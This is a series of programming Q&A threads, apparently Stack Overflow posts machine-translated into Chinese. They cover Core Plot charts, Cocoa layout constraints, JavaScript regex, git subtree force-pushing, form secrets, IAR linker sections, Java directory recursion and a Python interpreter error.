                      [NSDecimalNumber numberWithFloat:597.60], 
                      [NSDecimalNumber numberWithFloat:601.27], 
                      [NSDecimalNumber numberWithFloat:609.72], 
                      [NSDecimalNumber numberWithFloat:615.47], 
                      [NSDecimalNumber numberWithFloat:614.98], 
                      [NSDecimalNumber numberWithFloat:604.85],                  
                      nil];
        }
        return prices;
    }

    - (NSArray *)monthlyMsftPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:32.29], 
                      [NSDecimalNumber numberWithFloat:31.94], 
                      [NSDecimalNumber numberWithFloat:31.21], 
                      [NSDecimalNumber numberWithFloat:31.52], 
                      [NSDecimalNumber numberWithFloat:31.10], 
                      [NSDecimalNumber numberWithFloat:30.47], 
                      [NSDecimalNumber numberWithFloat:30.35], 
                      [NSDecimalNumber numberWithFloat:30.98], 
                      [NSDecimalNumber numberWithFloat:30.81],
                      [NSDecimalNumber numberWithFloat:31.08], 
                      [NSDecimalNumber numberWithFloat:31.44], 
                      [NSDecimalNumber numberWithFloat:31.14], 
                      [NSDecimalNumber numberWithFloat:31.01], 
                      [NSDecimalNumber numberWithFloat:32.42],
                      [NSDecimalNumber numberWithFloat:32.12], 
                      [NSDecimalNumber numberWithFloat:31.92], 
                      [NSDecimalNumber numberWithFloat:32.20], 
                      [NSDecimalNumber numberWithFloat:32.11], 
                      [NSDecimalNumber numberWithFloat:31.98],  
                      [NSDecimalNumber numberWithFloat:32.02],                  
                      nil];
        }
        return prices;
    }

@end

    #import "CPDBarGraphViewController.h"

    @interface CPDBarGraphViewController ()

    @property (nonatomic, strong) IBOutlet CPTGraphHostingView *hostView;
    @property (nonatomic, strong) CPTBarPlot *aaplPlot;
    @property (nonatomic, strong) CPTBarPlot *googPlot;
    @property (nonatomic, strong) CPTBarPlot *msftPlot;
    @property (nonatomic, strong) CPTPlotSpaceAnnotation *priceAnnotation;

    -(IBAction)aaplSwitched:(id)sender;
    -(IBAction)googSwitched:(id)sender;
    -(IBAction)msftSwitched:(id)sender;

    -(void)initPlot;
    -(void)configureGraph;
    -(void)configurePlots;
    -(void)configureAxes;
    -(void)hideAnnotation:(CPTGraph *)graph;

    @end

    @implementation CPDBarGraphViewController

    CGFloat const CPDBarWidth = 0.25f;
    CGFloat const CPDBarInitialX = 0.25f;

    @synthesize hostView    = hostView_;
    @synthesize aaplPlot    = aaplPlot_;
    @synthesize googPlot    = googPlot_;
    @synthesize msftPlot    = msftPlot_;
    @synthesize priceAnnotation = priceAnnotation_;

    #pragma mark - Rotation
    -(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
        return (interfaceOrientation == UIInterfaceOrientationLandscapeLeft);
    }

    #pragma mark - UIViewController lifecycle methods
    -(void)viewDidLoad {
        [super viewDidLoad];
        [self initPlot];
    }

    #pragma mark - Chart behavior
    -(void)initPlot {
        self.hostView.allowPinchScaling = NO;
        [self configureGraph];
        [self configurePlots];
        [self configureAxes];    
    }

    -(void)configureGraph {
        // 1 - Create the graph
        CPTGraph *graph = [[CPTXYGraph alloc] initWithFrame:self.hostView.bounds];
        graph.plotAreaFrame.masksToBorder = NO;
        self.hostView.hostedGraph = graph;    
        // 2 - Configure the graph    
        [graph applyTheme:[CPTTheme themeNamed:kCPTPlainBlackTheme]];    
        graph.paddingBottom = 30.0f;      
        graph.paddingLeft  = 30.0f;
        graph.paddingTop    = -1.0f;
        graph.paddingRight  = -5.0f;
        // 3 - Set up styles
        CPTMutableTextStyle *titleStyle = [CPTMutableTextStyle textStyle];
        titleStyle.color = [CPTColor whiteColor];
        titleStyle.fontName = @"Helvetica-Bold";
        titleStyle.fontSize = 16.0f;
        // 4 - Set up title
        NSString *title = @"Portfolio Prices: April 23 - 27, 2012";
        graph.title = title;  
        graph.titleTextStyle = titleStyle;
        graph.titlePlotAreaFrameAnchor = CPTRectAnchorTop;
        graph.titleDisplacement = CGPointMake(0.0f, -16.0f);
        // 5 - Set up plot space
        CGFloat xMin = 0.0f;
        CGFloat xMax = [[[CPDStockPriceStore sharedInstance] datesInWeek] count];
        CGFloat yMin = 0.0f;
        CGFloat yMax = 800.0f;  // should determine dynamically based on max price
        CPTXYPlotSpace *plotSpace = (CPTXYPlotSpace *) graph.defaultPlotSpace;
        plotSpace.xRange = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(xMin) length:CPTDecimalFromFloat(xMax)];
        plotSpace.yRange = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(yMin) length:CPTDecimalFromFloat(yMax)];
    }

    -(void)configurePlots {
        // 1 - Set up the three plots
        self.aaplPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor redColor] horizontalBars:NO];
        self.aaplPlot.identifier = CPDTickerSymbolAAPL;
        self.googPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor greenColor] horizontalBars:NO];
        self.googPlot.identifier = CPDTickerSymbolGOOG;
        self.msftPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor blueColor] horizontalBars:NO];
        self.msftPlot.identifier = CPDTickerSymbolMSFT;
        // 2 - Set up line style
        CPTMutableLineStyle *barLineStyle = [[CPTMutableLineStyle alloc] init];
        barLineStyle.lineColor = [CPTColor lightGrayColor];
        barLineStyle.lineWidth = 0.5;
        // 3 - Add plots to graph
        CPTGraph *graph = self.hostView.hostedGraph;
        CGFloat barX = CPDBarInitialX;
        NSArray *plots = [NSArray arrayWithObjects:self.aaplPlot, self.googPlot, self.msftPlot, nil];
        for (CPTBarPlot *plot in plots) {
            plot.dataSource = self;
            plot.delegate = self;
            plot.barWidth = CPTDecimalFromDouble(CPDBarWidth);
            plot.barOffset = CPTDecimalFromDouble(barX);
            plot.lineStyle = barLineStyle;
            [graph addPlot:plot toPlotSpace:graph.defaultPlotSpace];
            barX += CPDBarWidth;
        } 
    }

    -(void)configureAxes {
        // 1 - Configure styles
        CPTMutableTextStyle *axisTitleStyle = [CPTMutableTextStyle textStyle];
        axisTitleStyle.color = [CPTColor whiteColor];
        axisTitleStyle.fontName = @"Helvetica-Bold";
        axisTitleStyle.fontSize = 12.0f;
        CPTMutableLineStyle *axisLineStyle = [CPTMutableLineStyle lineStyle];
        axisLineStyle.lineWidth = 2.0f;
        axisLineStyle.lineColor = [[CPTColor whiteColor] colorWithAlphaComponent:1];
        // 2 - Get the graph's axis set
        CPTXYAxisSet *axisSet = (CPTXYAxisSet *) self.hostView.hostedGraph.axisSet;
        // 3 - Configure the x-axis
        axisSet.xAxis.labelingPolicy = CPTAxisLabelingPolicyNone;
        axisSet.xAxis.title = @"Days of Week (Mon - Fri)"; 
        axisSet.xAxis.titleTextStyle = axisTitleStyle;    
        axisSet.xAxis.titleOffset = 10.0f;
        axisSet.xAxis.axisLineStyle = axisLineStyle;    
        // 4 - Configure the y-axis
        axisSet.yAxis.labelingPolicy = CPTAxisLabelingPolicyNone;
        axisSet.yAxis.title = @"Price";
        axisSet.yAxis.titleTextStyle = axisTitleStyle;
        axisSet.yAxis.titleOffset = 5.0f;      
        axisSet.yAxis.axisLineStyle = axisLineStyle;        
    }

    -(void)hideAnnotation:(CPTGraph *)graph {
        if ((graph.plotAreaFrame.plotArea) && (self.priceAnnotation)) {
            [graph.plotAreaFrame.plotArea removeAnnotation:self.priceAnnotation];
            self.priceAnnotation = nil;
        }
    }

    #pragma mark - CPTPlotDataSource methods
    -(NSUInteger)numberOfRecordsForPlot:(CPTPlot *)plot {
        return [[[CPDStockPriceStore sharedInstance] datesInWeek] count];
    }

    -(NSNumber *)numberForPlot:(CPTPlot *)plot field:(NSUInteger)fieldEnum recordIndex:(NSUInteger)index {
        if ((fieldEnum == CPTBarPlotFieldBarTip) && (index < [[[CPDStockPriceStore sharedInstance] datesInWeek] count])) {
            if ([plot.identifier isEqual:CPDTickerSymbolAAPL]) {
                return [[[CPDStockPriceStore sharedInstance] weeklyPrices:CPDTickerSymbolAAPL] objectAtIndex:index];
            }   }
        return [NSDecimalNumber numberWithUnsignedInteger:index]; 
    }

    #pragma mark - CPTBarPlotDelegate methods
    -(void)barPlot:(CPTBarPlot *)plot barWasSelectedAtRecordIndex:(NSUInteger)index {

         NSLog(@"barWasSelectedAtRecordIndex %d", index);
    }

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T11:16:51.747

这里有[另一个教程](http://www.gilthonwe.com/2012/06/09/stacked-bar-chart-coreplot-ios/)可以帮助你。

检查 3\. 图表的布局，第 24 行。在那里他动态地制作了 Y 轴，但这完全取决于您如何制作数据源。

希望它清除:)

# macos - caconstraint 与 nslayoutconstraint

> ID：13756052
> 
> 赞同：6
> 
> 时间：2012-12-07T02:27:02.487
> 
> 标签：macos, cocoa, core-animation, autolayout

对于一个新的应用程序，它将有一个相当复杂的 gui，其中包含许多（数百个）（嵌套）图形，每个图形只包含一个单词、一个图像、一个路径、一个渐变或一个路径。其中只有一部分是需要 ui 交互的实际 ui 元素。

现在在我看来，最明智的做法是混合使用 CALayers 和 NSViews + CAConstraint 和 NSLayoutConstraint。

那么 CAConstraint 和 NSLayoutConstraint 是什么关系呢？（后者只是前者的超集吗？）

有什么权衡？（我猜 CALayer+CAConstraint 效率更高）

我已经知道： * iOS 不支持 CAConstraint（真的不在乎） * NSLayoutConstraint 稍微强大一些（基于优先级的冲突中断、非相等关系、基于 IB 和字符串的设置）

# php - 如何使用类似于 PHP 的 preg_match_all() 的 javascript 提取 href= 和 title 值？

> ID：13756053
> 
> 赞同：0
> 
> 时间：2012-12-07T02:27:01.613
> 
> 标签：php, javascript, jquery, regex

我得到了一个 HTML 字符串作为 :var 代码；我想提取类似于使用 PHP 的 href 和 title 的所有值`preg_match_all()`。我在 PHP 中做了类似的事情，但想知道如何在 JavaScript 中做到这一点，并将数组中的所有 href 和 title 值作为 PHP 示例？

注意：初始值为`$input`div 块，如下例所示：

```
<div class="up"  rel="1234" id="up1234" style="float:right">
<div class="pic" style='border:3px solid #cacaca' >
 <a href="/episode 14" title="episode 14">
    <img src="images/image14.jpg" alt="watch episode 14"  />
 </a> 
</div>
<a href="/episode 14" title="episode 14 "class="title">watch episode 14</a> 
<div class="data" style="height:auto">watch episode 14 </div>
<center>
 <a href="episode14" title="episode 14" class="data" id="play_me1234">
 <img src="/images/image14.jpg" alt="watch episode 14"/>
 </a>
</center>
    </div>

preg_match_all('#href\s*=\s*"(.*)"#siU', $input, $foo1);
preg_match_all("#class=\"title\">([^<]+)</a>#", $input, $foo2);

$i = -1;
$foo1[1] = array_unique($foo1[1]);
 foreach($foo1[1] as $k => $v ){
  //echo $v;

 $i++;
echo '<a href="./doit.php?Id='.$v.'&title='.$foo2[1][$i].'"> '.$foo2[1][$i].' </a> <br />' ;
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:36:46.517

```
<script type="text/javascript">
    var pattern = /<a href="([^"]+?)" title="[^"]+?" class="title">([^<]+?)<\/a>/gi;
    code = code.match(pattern);
    for (i = 0; i < code.length; i++) {
        document.write(code[i].replace(pattern, '<a href="./doit.php?Id=$1&title=$2">$2</a><br />'));
    }
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:18:25.587

你想用`code.match(/your regex here/g)`. `g`修饰符改变了`match`行为方式，使其返回一个完整匹配的数组，而不是只返回第一个匹配，代价是丢失子模式。您可以通过再次将匹配项与正则表达式匹配来恢复它们的子模式，但这次没有修饰符。

也就是说，您可以只解析 DOM。如果元素中有 HTML，则可以使用它`querySelectorAll("[href]")`来查找具有`href`属性的元素并循环遍历它们。同样，用于`querySelectorAll(".title")`更可靠地查找“标题”元素。

# git - 为什么我不能推送这个最新的 Git 子树？

> ID：13756055
> 
> 赞同：93
> 
> 时间：2012-12-07T02:27:22.930
> 
> 标签：git, git-subtree

我将 Git 子树与我正在处理的几个项目一起使用，以便在它们之间共享一些基本代码。基本代码经常更新，并且升级可以发生在任何项目中，最终所有项目都会更新。

我遇到了一个问题，git 报告我的子树是最新的，但推送被拒绝。例如：

```
#! git subtree pull --prefix=public/shared project-shared master
From github.com:****
* branch            master     -> FETCH_HEAD
Already up-to-date. 
```

如果我推，我应该得到一条消息，没有什么可以推...对吗？对？:(

```
#! git subtree push --prefix=public/shared project-shared master
git push using:  project-shared master
To git@github.com:***
! [rejected]        72a6157733c4e0bf22f72b443e4ad3be0bc555ce -> master (non-fast-forward)
error: failed to push some refs to 'git@github.com:***'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Merge the remote changes (e.g. 'git pull')
hint: before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details. 
```

这可能是什么原因？为什么推送失败？

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2013-03-25T19:49:57.383

我在此博客评论[https://coderwall.com/p/ssxp5q上找到了答案](https://coderwall.com/p/ssxp5q)

> 如果您在推送时遇到“由于当前分支的尖端落后而导致更新被拒绝。合并远程更改（例如'git pull'）”问题（由于任何原因，尤其是与 git 历史记录有关）那么您需要嵌套 git 命令，以便您可以强制推送到 heroku。例如，给定上面的例子：

```
git push heroku `git subtree split --prefix pythonapp master`:master --force 
```

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2015-03-06T17:18:31.260

在 Windows 上，嵌套命令不起作用：

```
git push heroku `git subtree split --prefix pythonapp master`:master --force 
```

您可以先运行嵌套位：

```
git subtree split --prefix pythonapp master 
```

这将（在很多数字之后）返回一个令牌，例如

```
157a66d050d7a6188f243243264c765f18bc85fb956 
```

在包含命令中使用它，例如：

```
git push heroku 157a66d050d7a6188f243243264c765f18bc85fb956:master --force 
```

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2015-06-08T17:10:54.833

使用`--onto`标志：

```
# DOESN'T WORK: git subtree push --prefix=public/shared project-shared master --onto=project-shared/master 
```

[编辑：不幸的`subtree push`是没有转发`--onto`到底层`split`，所以操作必须在两个命令中完成！完成后，我发现我的命令与其他答案之一中的命令相同，但解释不同，所以无论如何我都会把它留在这里。]

```
git push project-shared $(git subtree split --prefix=public/shared --onto=project-shared/master):master 
```

或者，如果您不使用 bash：

```
git subtree split --prefix=public/shared --onto=project-shared/master
# This will print an ID, say 0123456789abcdef0123456789abcdef,
# which you then use as follows:
git push project-shared 01234567:master 
```

我花了几个小时仔细研究 git-subtree 源来解决这个问题，所以我希望你能欣赏它；）

`subtree push`从运行开始`subtree split`，它将您的提交历史重写为应该准备好推送的格式。它这样做的方式是，它会剥离`public/shared/`任何包含它的路径的前面，并删除有关没有它的文件的任何信息。*这意味着即使您提取非压缩文件，所有上游子存储库提交都将被忽略，因为它们以裸路径命名文件。*（不涉及任何文件的提交`public/shared/`，或与父级相同的合并提交，也会被折叠。[编辑：另外，我已经发现了一些壁球检测，所以现在我认为只有当你拉出非挤压，然后在另一个答案中描述的简单合并提交折叠设法选择非挤压路径和丢弃压扁的路径。]) 结果是，它尝试推送的内容最终包含有人提交到您正在推送的当前主机存储库的任何工作，但不包含直接提交到子存储库或通过其他主机的工作人员存储库。

但是，如果您使用`--onto`，则所有上游提交都被记录为可以逐字使用，因此当重写过程遇到它们作为要重写的合并的父级之一时，它将保留它们而不是尝试重写它们以通常的方式。

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2016-06-23T19:16:23.867

对于“GitHub pages”类型的应用程序，您将“dist”子树部署到 gh-pages 分支，解决方案可能看起来像这样

```
git push origin `git subtree split --prefix dist master`:gh-pages --force 
```

我提到这一点是因为它看起来与上面给出的 heroku 示例略有不同。您可以看到我的“dist”文件夹存在于我的 repo 的 master 分支上，然后我将它作为子树推送到 gh-pages 分支，该分支也在原点上。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2019-03-21T08:52:32.383

也有这个问题。根据最佳答案，这是我所做的：

鉴于：

```
#! git subtree push --prefix=public/shared project-shared master
git push using:  project-shared master
To git@github.com:***
! [rejected]        72a6157733c4e0bf22f72b443e4ad3be0bc555ce -> master (non-fast-forward)
error: failed to push some refs to 'git@github.com:***'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Merge the remote changes (e.g. 'git pull')
hint: before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details. 
```

输入这个：

```
git push <origin> 72a6157733c4e0bf22f72b443e4ad3be0bc555ce:<branch> --force 
```

请注意，“git subtree push”输出的令牌在“git push”中使用。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2013-08-08T16:32:33.710

我以前也遇到过这个问题，下面是我的解决方法。

我发现我有一个未附加到本地主分支的分支。这个分支存在，它只是悬在虚空中。在您的情况下，它可能称为`project-shared`. 假设是这种情况，并且当您执行 a 时，`git branch`您可以看到一个本地`project-shared`分支，那么您可以通过执行以下操作将新提交“*追加*`project-shared`”到现有分支：

`git subtree split --prefix=public/shared --onto public-shared --branch public-shared`

我理解的方式是`git subtree`从 开始创建新分支`--onto`，在这种情况下是本地`public-shared`分支。然后分支意味着创建一个分支，它只是替换旧`public-shared`分支。

这将保留`public-shared`分支的所有以前的 SHA。最后，你可以做一个

`git push project-shared project-shared:master`

假设您也有`project-shared`遥控器；这会将void分支中的本地*挂起* 推送到远程分支。`project-shared``master``project-shared`

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2015-02-06T01:11:47.387

这是因为原始算法的限制。在处理合并提交时，原始算法使用简化的标准来切断不相关的父母。特别是，它检查是否存在具有相同树的父级。如果找到这样的父级，它将折叠合并提交并改用父级提交，假设其他父级具有与子树无关的更改。在某些情况下，这将导致删除部分历史记录，这些历史记录对子树有实际更改。特别是它会丢弃提交序列，这会触及子树，但会产生相同的子树值。

让我们看一个示例（您可以轻松复制）以更好地了解其工作原理。考虑以下历史（行格式为：commit [tree] subject）：

```
% git log --graph --decorate --pretty=oneline --pretty="%h [%t] %s"
*   E [z] Merge branch 'master' into side-branch
|\
| * D [z] add dir/file2.txt
* | C [y] Revert "change dir/file1.txt"
* | B [x] change dir/file1.txt
|/
*   A [w] add dir/file1.txt 
```

在这个例子中，我们在`dir`. 提交`D`并`E`拥有相同的 tree `z`，因为我们有 commit `C`，它撤销了 commit `B`，所以即使它对它进行了更改， `B-C`sequence 也不做任何事情。`dir`

现在让我们进行拆分。首先，我们在 commit 上拆分`C`。

```
% git log `git subtree split -P dir C` ...
* C' [y'] Revert "change dir/file1.txt"
* B' [x'] change dir/file1.txt
* A' [w'] add dir/file1.txt 
```

接下来我们在 commit 上拆分`E`。

```
% git log `git subtree split -P dir E` ...
* D' [z'] add dir/file2.txt
* A' [w'] add dir/file1.txt 
```

是的，我们丢失了两次提交。这会在尝试推送第二个拆分时导致错误，因为它没有这两个提交，而这两个提交已经进入原点。

通常你可以通过使用来容忍这个错误`push --force`，因为丢弃的提交通常不会包含关键信息。从长远来看，这个 bug 需要修复，因此拆分历史实际上会包含所有的提交，这些提交`dir`与预期的一样。我希望修复包括对隐藏依赖项的父提交进行更深入的分析。

作为参考，这里是负责该行为的原始代码部分。

```
copy_or_skip()
  ...
  for parent in $newparents; do
      ptree=$(toptree_for_commit $parent) || exit $?
      [ -z "$ptree" ] && continue
      if [ "$ptree" = "$tree" ]; then
          # an identical parent could be used in place of this rev.
          identical="$parent"
      else
          nonidentical="$parent"
      fi
  ...
  if [ -n "$identical" ]; then
      echo $identical
  else
      copy_commit $rev $tree "$p" || exit $?
  fi 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-03-20T15:49:30.663

埃里克伍德拉夫的回答对我没有帮助，但以下内容对我有帮助：

我通常使用“--squash”选项来“git subtree pull”。看起来这确实让事情变得更难调和，所以这次我需要在不压缩的情况下进行子树拉取，解决一些冲突然后推送。

我必须补充一点，压扁的拉力没有显示任何冲突，告诉我一切都很好。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-05-27T14:34:50.513

另一个 [更简单] 的解决方案是如果可以的话，通过再次提交来提升遥控器的头部。将这个高级头拉入本地子树后，您将能够再次从中推送。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-03-13T10:40:37.730

您可以强制将本地更改推送到远程子树存储库

```
git push subtree_remote_address.git `git subtree split --prefix=subtree_folder`:refs/heads/branch --force 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-01-26T02:40:40.463

基于 Chris Jordan 解决方案的 Windows 用户快速 powershell

```
$id = git subtree split --prefix pythonapp master
Write-Host "Id is: $id"
Invoke-Expression "git push heroku $id`:master --force" 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-01-11T20:07:19.847

所以这就是我根据@entheh 所说的话写的。

```
for /f "delims=" %%b in ('git subtree split --prefix [name-of-your-directory-on-the-file-system-you-setup] -b [name-of-your-subtree-branch]') do @set token=%%b
git push [alias-for-your-subtree] %token%:[name-of-your-subtree-branch] --force

pause 
```

# php - 表单提交后传递数据的安全方式？

> ID：13756057
> 
> 赞同：0
> 
> 时间：2012-12-07T02:27:37.823
> 
> 标签：php, codeigniter

我正在编写一个从服务器获取信息的小应用程序，允许用户对其进行操作，然后将其保存回服务器。从服务器获取信息时，服务器也会给出密码。当信息被发送回服务器时，服务器会查找密码，作为安全预防措施。

我的问题是，表单提交后传递密码的安全方法是什么？我考虑了隐藏字段，但这可以找到密码。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T08:22:09.087

您可以将其存储在具有特定字段的会话中，该字段定义密码并在使用后销毁。

这是更好的用法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:33:49.967

您可以将密码提供给 Javascript/jQuery，然后拦截正常的表单提交，将密码附加到发布数据，然后重新提交表单，但这可能有点矫枉过正......

只要密码不用于其他任何用途（因为它是随机生成的）并且它是一次性使用的，将它放在隐藏字段中应该不是什么大问题。普通用户不知道如何查看隐藏字段。但是，如果您通过 HTTP 而不是 HTTPS 进行连接，那么普通黑客将能够查看来自未加密网络的密码，并可能在您的用户之前使用它。

# embedded - IAR 初始化函数放置

> ID：13756058
> 
> 赞同：3
> 
> 时间：2012-12-07T02:27:41.597
> 
> 标签：embedded, iar

有谁知道如何处理以下问题：
我有一个 IAR Embedded 工作台。该项目也使用 SDRAM 来运行它的代码和 Flash ROM。SDRAM 的代码是从 SD 卡加载的。但是，在 SDRAM 中也存储了一些数据，例如全局变量或静态变量。其中一些必须初始化。初始化步骤，`iar_data_init3`函数调用，在`low_level_init`函数之后进行。所以问题是，为了初始化 SDRAM 中的一些变量，初始化函数是从 调用的`iar_data_init3`，其代码在 SDRAM 本身内部。这是错误的，因为尚未从 SD 卡加载 SDRAM 代码。

我已尝试按照 C/C++ 开发指南中的说明进行手动初始化，但这并没有帮助。

被调用的函数是`__sti__routine`，它提供变量的初始化。所有这些功能都是由 IAR 生成的。有没有办法告诉链接器将初始化函数放入 Flash ROM？

**编辑 1：** 这是来自 IAR 手册的 C/C++ 信息。这是一个如何使用手动初始化的示例。

在链接器配置文件中：

```
initialize manually { section MYSECTION }; 
```

然后 IAR 文档说：

您可以使用此源代码示例来初始化该部分：

```
#pragma section = "MYSECTION"
#pragma section = "MYSECTION_init"
void DoInit()
{
char * from = __section_begin("MYSECTION_init");
char * to = __section_begin("MYSECTION");
memcpy(to, from, __section_size("MYSECTION"));
} 
```

但是，我不明白，首先，MYSECTION_init 和 MYSECTION 之间有什么区别。另外，如果我有一个全局变量：

```
SomeClass myclass; 
```

而且它应该放在SDRAM中，那么它的初始化是怎么做的呢？我想手动初始化变量，并将初始化函数放入闪存 ROM。（问题是通过将变量放置到 SDRAM 中，它的初始化函数也放置到了 SDRAM 中）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T12:47:35.013

[`pragma`](http://supp.iar.com/Support/?note=27498)您可以通过使用预处理器指令指定变量和函数的位置。您将需要使用任一预定义部分或定义您自己的部分。

您没有提及您正在使用的 IAR 的特定风格。以下内容来自[Renesas IAR 编译器参考指南](http://supp.iar.com/FilesPublic/UPDINFO/004352/ewr32c_compilerreference.pdf)，但您应该查看正确的参考指南以确保语法完全相同并了解预定义部分是什么。

> 使用`@`运算符或`#pragma`位置指令将函数组或全局变量和静态变量放在命名段中，而无需显式控制每个对象。变量必须声明为`__no_init`或`const`。例如，可以将段放置在内存的特定区域中，或者使用段开始和结束运算符以受控方式进行初始化或复制。如果您想要单独链接的单元之间的接口，例如应用程序项目和引导加载程序项目，这也很有用。当不需要对单个变量的位置进行绝对控制或无用时，请使用命名段。
> 
> # 将函数放置在命名段中的示例
> 
> ```
> void f(void) @ "FUNCTIONS";
> 
> void g(void) @ "FUNCTIONS"
> {
> }
> 
> #pragma location="FUNCTIONS"
> void h(void); 
> ```
> 
> 要覆盖默认段分配，您可以显式指定除默认值之外的内存属性：
> 
> ```
> __code32 void f(void) @ "FUNCTIONS"; 
> ```

* * *

# 编辑

根据您的评论，您应该有一个名为的链接器文件`generic_cortex.icf`来定义您的内存区域。其中应该有类似于以下内容的说明：

```
/* Define the addressable memory */
define memory Mem with size = 4G;

/* Define a region named SDCARD with start address 0xA0000000 and to be 256 Mbytes large */
define region SDCARD = Mem:[from 0xA0000000 size 0xFFFFFFF ];

/* Define a region named SDRAM with start address 0xB0000000 and to be 256 Mbytes large */
define region SDRAM = Mem:[from 0xB0000000 size 0xFFFFFFF ];

/* Place sections named MyCardStuff in the SDCARD region */
place in SDCARD {section MyCardStuff };

/* Place sections named MyRAMStuff in the SDRAM region */
place in SDRAM {section MyRAMStuff };

/* Override default copy initialization for named section */
initialize manually { section MyRAMStuff }; 
```

实际名称、地址和大小会有所不同，但应该看起来相似。我只是使用[数据表](http://www.nxp.com/documents/data_sheet/LPC178X_7X.pdf)中前两个动态内存区域的完整大小。这里发生的是您为不同类型的内存（即您的 SD 卡和 SDRAM）分配名称到地址空间，以便在编译期间命名的部分将由链接器放置在正确的位置。

所以首先你必须定义地址空间`define memory`：

> 可能的可寻址存储器的最大大小
> 
> 该`define memory`指令定义了具有给定大小的内存空间，这是可寻址内存的最大可能数量，不一定是物理可用的。

然后告诉它哪些芯片去哪里`define region`：

> 可用物理内存
> 
> 该`define region`指令在可用存储器中定义了一个区域，其中可以放置应用程序代码的特定部分和应用程序数据的部分。

接下来，链接器需要知道`region`将命名`section`的内容放在什么位置`place in`：

> 在区域中放置部分
> 
> `place at`和指令将`place into`具有相似属性的部分集合放入先前定义的区域中。

并告诉链接器您想要覆盖它的部分初始化`initialize manually`：

> 初始化应用程序
> 
> 指令`initialize`和`do not initialize`控制应用程序应该如何启动。使用这些指令，应用程序可以在启动时初始化全局符号，并复制代码片段。

最后，在您的 C 文件中，告诉编译器哪些部分包含哪些内容以及如何初始化声明的部分`manually`。

```
SomeClass myClass @ "MyCardStuff";

#pragma section = "MyCardStuff"
#pragma section = "MySDRAMStuff"
void DoInit()
{
    /* Copy your code and variables from your SD Card into SDRAM */
    char * from = __section_begin("MyCardStuff");
    char * to = __section_begin("MySDRAMStuff");
    memcpy(to, from, __section_size("MySDRAMStuff"));

    /* Initialize your variables */
    myClass.init();
} 
```

为了在多个不同的内存设备之间自定义启动初始化，您需要非常仔细地学习[IAR Development Guide for ARM 。](http://supp.iar.com/FilesPublic/UPDINFO/004916/arm/doc/EWARM_DevelopmentGuide.ENU.pdf)还可以尝试打开该`--log initialization`选项并研究日志和地图文件，以确保您得到您想要的。

# java - 从目录+子目录读取

> ID：13756059
> 
> 赞同：1
> 
> 时间：2012-12-07T02:27:43.050
> 
> 标签：java, directory, subdirectory

这是一个半家庭作业，我已经尝试了很长时间，但没有运气，基本上我正在做一个类似搜索引擎的程序，我在我的目录+它们的子目录中读取文件并读取文本文件以搜索匹配项，我无休止地搜索，但没有明确的答案，所以如果有人能提供帮助，我将不胜感激。

这是我最好的尝试，但它的问题是它只从子目录中获取文件而忽略了主/根目录，试图找出原因但不能。

```
 public void indexDirectory(File dir) {
       for(int i=0;i<50;i++)
           ls[i]=new LinkList();//array of Linked lists to store addresses of each Linked list that has a file 
    try{
       files= dir.listFiles();

       for (int i = 0; i < files.length; i++) {
           if(files[i].isDirectory())
               indexDirectory(files[i]);

           if(files[i].isFile()){
               if(files[i]!=null)
                   indexFile(files[i]);
       } //end if(isFile)
      } //end For loop
   }catch(FileNotFoundException e){
       System.out.println("error ");

   }} 
```

在搜索网络并尝试模仿我发现的内容后的第二个版本，但遗憾的是没有工作。

```
public void indexDirectory(File dir) {

       for(int i=0;i<50;i++)
           ls[i]=new LinkList();
    try{
       if(dir.isFile()){
     indexFile(dir); //this method takes each directory and read the words and save them  in
                            //      array of linked list
       }
 else if(dir.isDirectory()){
     files= dir.listFiles();
       if(files!=null) {
       for (int i = 0; i < files.length; i++)  {
           if(files[i].isDirectory()){
           indexDirectory(files[i]);      //recursive call
       }}
   }catch(FileNotFoundException e){
       System.out.println("error ");

   }} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:41:47.830

在第一个版本中，您遍历整个 file.length 并仅检查 file.isDirectory ，然后（即在遍历所有文件/文件夹之后）检查它是否是一个文件。这就是为什么您无法读取当前目录的文件的原因。简单地说

```
if(files[i].isFile()){
           if(files[i]!=null)
 indexFile(files[i]);      //the method to read from these files and save to array of lists.
       } 
```

阻塞 for 循环，它应该在第一个版本中工作。还有一件事我不明白这里 ls 变量的用途。

# python - 什么可能导致python中的块堆栈下溢？

> ID：13756061
> 
> 赞同：3
> 
> 时间：2012-12-07T02:28:02.887
> 
> 标签：python, python-2.7, web, webob, stackunderflow

## 应用程序上下文

我们正在使用“单独的”WebOb 开发一个实验性的 Web 框架。我们正在处理并发请求，它基本上是一个非常简单的 WebOb 集成。我们在 webfaction.com 上托管我们的应用程序

问题是我们的日志中出现了这个致命的 Python 错误：

```
Fatal Python error: XXX block stack underflow 
```

